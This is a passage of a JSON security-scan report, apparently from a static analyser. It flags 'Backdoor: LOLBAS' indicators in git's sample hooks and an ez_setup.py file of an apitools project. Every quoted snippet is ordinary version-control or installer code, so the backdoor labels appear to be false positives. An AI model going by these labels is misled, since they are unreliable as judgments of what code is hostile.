          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 11,
                  "endLine": 31,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                    "rendered": {
                      "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                      "markdown": "`\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                    "rendered": {
                      "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                      "markdown": "`then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 25,
                  "endLine": 10,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 2,
                  "endLine": 10,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 45,
                  "endLine": 161,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                    "rendered": {
                      "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                      "markdown": "`\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 29,
                  "endLine": 151,
                  "endColumn": 33,
                  "snippet": {
                    "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                    "rendered": {
                      "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                      "markdown": "` * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 10,
                  "endLine": 131,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                    "rendered": {
                      "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                      "markdown": "`    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 61,
                  "endLine": 104,
                  "snippet": {
                    "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                    "rendered": {
                      "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                      "markdown": "`\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 165,
                  "endLine": 165,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                    "rendered": {
                      "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                      "markdown": "`\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 159,
                  "endLine": 159,
                  "endColumn": 5,
                  "snippet": {
                    "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                    "rendered": {
                      "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                      "markdown": "`To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 158,
                  "endLine": 158,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                    "rendered": {
                      "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                      "markdown": "`\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 12,
                  "endLine": 125,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                    "rendered": {
                      "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                      "markdown": "`\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 42,
                  "endLine": 102,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                    "rendered": {
                      "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                      "markdown": "`   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 30,
                  "endLine": 40,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                      "markdown": "`# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 9,
                  "snippet": {
                    "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                    "rendered": {
                      "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                      "markdown": "`esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 48,
                  "endLine": 26,
                  "snippet": {
                    "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                    "rendered": {
                      "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                      "markdown": "`\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                    "rendered": {
                      "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                      "markdown": "`\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 18,
                  "endLine": 5,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                    "rendered": {
                      "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                      "markdown": "`\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 221,
                  "startColumn": 16,
                  "endLine": 221,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        try:\n            from setuptools.command.easy_install import main\n        except ImportError:\n            from easy_install import main\n        main(list(argv)+[download_setuptools(delay=0)])\n        sys.exit(0) # try to force an exit\n    else:\n",
                    "rendered": {
                      "text": "        try:\n            from setuptools.command.easy_install import main\n        except ImportError:\n            from easy_install import main\n        main(list(argv)+[download_setuptools(delay=0)])\n        sys.exit(0) # try to force an exit\n    else:\n",
                      "markdown": "`        try:\n            from setuptools.command.easy_install import main\n        except ImportError:\n            from easy_install import main\n        main(list(argv)+[download_setuptools(delay=0)])\n        sys.exit(0) # try to force an exit\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 23,
                  "endLine": 144,
                  "endColumn": 29,
                  "snippet": {
                    "text": "and place it in this directory before rerunning this script.)\n---------------------------------------------------------------------------\"\"\",\n                    version, download_base, delay, url\n                ); from time import sleep; sleep(delay)\n            log.warn(\"Downloading %s\", url)\n            src = urllib2.urlopen(url)\n            # Read/write all in one block, so we don't create a corrupt file\n",
                    "rendered": {
                      "text": "and place it in this directory before rerunning this script.)\n---------------------------------------------------------------------------\"\"\",\n                    version, download_base, delay, url\n                ); from time import sleep; sleep(delay)\n            log.warn(\"Downloading %s\", url)\n            src = urllib2.urlopen(url)\n            # Read/write all in one block, so we don't create a corrupt file\n",
                      "markdown": "`and place it in this directory before rerunning this script.)\n---------------------------------------------------------------------------\"\"\",\n                    version, download_base, delay, url\n                ); from time import sleep; sleep(delay)\n            log.warn(\"Downloading %s\", url)\n            src = urllib2.urlopen(url)\n            # Read/write all in one block, so we don't create a corrupt file\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 47,
                  "endLine": 134,
                  "endColumn": 55,
                  "snippet": {
                    "text": "This script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\nI will start the download in %d seconds.\n\n(Note: if this machine does not have network access, please obtain the file\n",
                    "rendered": {
                      "text": "This script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\nI will start the download in %d seconds.\n\n(Note: if this machine does not have network access, please obtain the file\n",
                      "markdown": "`This script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\nI will start the download in %d seconds.\n\n(Note: if this machine does not have network access, please obtain the file\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
